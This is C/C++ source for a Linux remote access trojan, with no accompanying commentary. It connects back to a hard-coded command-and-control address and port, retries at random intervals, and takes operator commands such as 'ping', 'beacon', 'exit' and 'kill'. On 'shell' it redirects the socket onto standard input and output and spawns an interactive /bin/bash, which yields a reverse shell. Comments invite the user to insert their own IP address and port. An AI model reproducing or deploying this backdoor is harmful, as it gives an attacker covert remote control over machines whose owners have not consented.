#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include <iostream>
 
#define DEFAULT_BUFLEN 1024

void RAT(char* C2_Server, int C2_Port)
{
    srand(time(0));

    while (true)
    {
        sleep((rand() % 45) + 10);    // Trys to reconnect every 10-45 seconds

        int tcp_sock;
        struct sockaddr_in client;
        
        client.sin_family = AF_INET;
        client.sin_addr.s_addr = inet_addr(C2_Server);
        client.sin_port = htons(C2_Port);

        tcp_sock = socket(AF_INET,SOCK_STREAM,0);

        if (connect(tcp_sock,(struct sockaddr *)&client,sizeof(client)) == -1)
        {
            close(tcp_sock);
            continue;
        }
        else
        {

            char CommandReceived[DEFAULT_BUFLEN] = "";
            memset(CommandReceived, 0, sizeof(CommandReceived));

            while (true)
            {
                int sock_result = recv(tcp_sock, CommandReceived, DEFAULT_BUFLEN, 0);

                std::cout << "Command received: " << CommandReceived;
                std::cout << "Length of Command received: " << sock_result << std::endl;

                if (sock_result == -1)
                {
                    close(tcp_sock);
                    //WSACleanup();
                    std::cout << "Socket killed. Sleep Start" << std::endl;
                    sleep(1);
                    std::cout << "Dying..." << std::endl;
                    exit(0);
                }

                // Should only be used in individual interactive environments == TBC
                if ((strcmp(CommandReceived, "shell") == 0))
                {
                    // Establish descriptor handling
                    dup2(tcp_sock,0); // STDIN
                    dup2(tcp_sock,1); // STDOUT
                    dup2(tcp_sock,2); // STDERR

                    // execute bin/bash << 0,1,2
                    execl("/bin/bash","sh","-i",NULL,NULL);


                    memset(CommandReceived, 0, sizeof(CommandReceived));

                    // When the process exits, we send an agent-msg over to alert the C2
                    char buffer[64] = "";
                    strcat(buffer,"[* Agent-Msg] Exiting shell\n");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if (strcmp(CommandReceived, "ping") == 0)
                {
                    char buffer[64] = "";
                    strcat(buffer,"[*Agent-msg] PONG\n");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
			    }
                else if (strcmp(CommandReceived, "beacon") == 0)
                {
                    char buffer[128] = "";
                    strcat(buffer,"d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
			    }
                else if (strcmp(CommandReceived, "exit") == 0)
                {
                    close(tcp_sock);
                    std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
                    sleep(1000);
                    std::cout << "Sleep End... Returning" << std::endl;
                    break;
                }
                else if (strcmp(CommandReceived, "kill") == 0) 
                {
                    close(tcp_sock);
                    std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
                    sleep(1000);
                    std::cout << "Dying..." << std::endl;
                    exit(0);
			    }
                else
                {
                    char buffer[64] = "";
                    strcat(buffer,"[* Agent-Msg] Invalid Command\n");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
            }
        }
    }
}

int main (int argc, char **argv)
{
    char host[] = "192.168.75.100";     // change this to your ip address
    int port = 1337;                    // change this to your open port
    RAT(host, port);

  return 0;
}